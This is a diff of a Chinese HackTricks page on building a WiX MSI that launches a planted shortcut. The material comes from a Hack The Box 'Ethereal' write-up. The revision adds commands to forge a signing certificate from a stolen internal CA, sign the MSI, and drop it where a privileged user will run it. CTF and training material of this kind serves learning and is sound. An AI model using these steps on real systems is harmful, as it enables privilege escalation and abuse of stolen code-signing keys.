@@ -1,12 +1,12 @@
-# 创建恶意 MSI 并获取 Root 权限
+# 使用 WiX 创建 Custom-Action MSI
 
 {{#include ../../banners/hacktricks-training.md}}
 
-MSI installer 的创建将使用 wixtools，具体来说会使用 [wixtools](http://wixtoolset.org)。值得一提的是，我们也尝试过其他 MSI builder，但在这种特定情况下均未成功。<sup>[[1]](#references)</sup>
+这个历史上的 Hack The Box chain 使用 WiX Toolset v3 构建了一个可启动此前植入的 `.lnk` 文件的 MSI。**MSI 不会自动获得特权**：其执行上下文取决于 Windows Installer policy、custom-action attributes 以及安装者。在所引用的场景中，攻击者还窃取了一个受信任的 signing CA，并将签名后的 MSI 放入另一个用户监视的文件夹中。<sup>[[1]](#references)[[3]](#references)</sup>
 
-如需全面了解 wix MSI 的使用示例，建议参考[此页面](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)。其中包含多个演示 wix MSI 用法的示例。<sup>[[2]](#references)</sup>
+如需全面了解 wix MSI 的使用示例，建议参阅[此页面](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)。其中包含多个演示 wix MSI 用法的示例。<sup>[[2]](#references)</sup>
 
-目标是生成一个能够执行 lnk file 的 MSI。为实现这一目标，可以使用以下 XML code（[xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)）：<sup>[[1]](#references)</sup>
+该 MSI 会运行 `C:\Users\Public\Desktop\Shortcuts\rick.lnk`。下面保留了原始的 WiX v3 XML：<sup>[[1]](#references)</sup>
 ```html
 <?xml version="1.0"?>
 <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
@@ -38,25 +38,31 @@ fail_here
 </Product>
 </Wix>
 ```
-需要注意的是，Package 元素包含 InstallerVersion 和 Compressed 等属性，分别用于指定安装程序的版本以及指示软件包是否经过压缩。
+`InstallerVersion` 声明最低 Windows Installer 版本，而 `Compressed="yes"` 表示该 package 经过压缩。`Stage1` 是 deferred，但设置了 `Impersonate="yes"`，因此它会使用安装用户的 impersonated token 运行；在此场景中，privilege change 来自之后打开 MSI 的 privileged user，而不是该 attribute 神奇地授予了 SYSTEM 权限。<sup>[[3]](#references)</sup>
 
-创建过程需要使用 wixtools 中的 candle.exe 工具，根据 msi.xml 生成 wixobject。应执行以下命令：<sup>[[1]](#references)</sup>
+使用 `candle.exe` 将 source 编译为 WiX object：<sup>[[1]](#references)</sup>
 ```
-candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
+candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
 ```
-此外，值得一提的是，帖子中提供了一张展示该命令及其输出结果的图片。你可以参考它以获得直观指导。<sup>[[1]](#references)</sup>
-
-此外，还将使用 wixtools 中的另一个工具 light.exe，根据 wixobject 创建 MSI 文件。要执行的命令如下：<sup>[[1]](#references)</sup>
+使用 `light.exe` 将该对象链接到 MSI 中：<sup>[[1]](#references)</sup>
 ```
-light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
+light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
 ```
-与上一条命令类似，文章中包含一张图片，用于展示该命令及其输出。<sup>[[1]](#references)</sup>
+### 原始链中使用的签名步骤
 
-请注意，尽管此摘要旨在提供有价值的信息，但建议参考原始文章，以获取更全面的详情和准确的操作说明。<sup>[[1]](#references)</sup>
+目标工作流接受由被 compromise 的内部 CA 签名的软件包。该 write-up 从恢复的 `MyCA.cer`/`MyCA.pvk` 中派生出签名证书，创建 PFX，并对 MSI 进行签名：<sup>[[1]](#references)</sup>
+```powershell
+makecert.exe -n "CN=Ethereal" -pe -cy end `
+-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
+-sv C:\tmp\rick.pvk C:\tmp\rick.cer
+pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
+signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
+```
+攻击者随后将已签名的软件包放入 `D:\DEV\MSIs`，并等待特权 workflow/用户执行它。调整此技术时，请保留这一前提条件：如果没有提权安装路径、不安全的策略（例如 `AlwaysInstallElevated`），或特权受害者，该软件包只能以当前用户的权限执行。
 
-## 参考资料
+## References
 
-- [1] [Hack The Box - Ethereal：创建恶意 msi 并获取 root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
-- [2] [快速介绍：使用 WiX 创建 MSI 安装程序 - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)（另请参阅 [wixtools](http://wixtoolset.org)）
-
+- [1] [Hack The Box - Ethereal：创建恶意 msi 并获取 root 权限 - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
+- [2] [快速介绍：使用 WiX 创建 MSI 安装程序 - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
+- [3] [Microsoft Learn — 延迟执行 custom actions（`Impersonate`）](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
 {{#include ../../banners/hacktricks-training.md}}
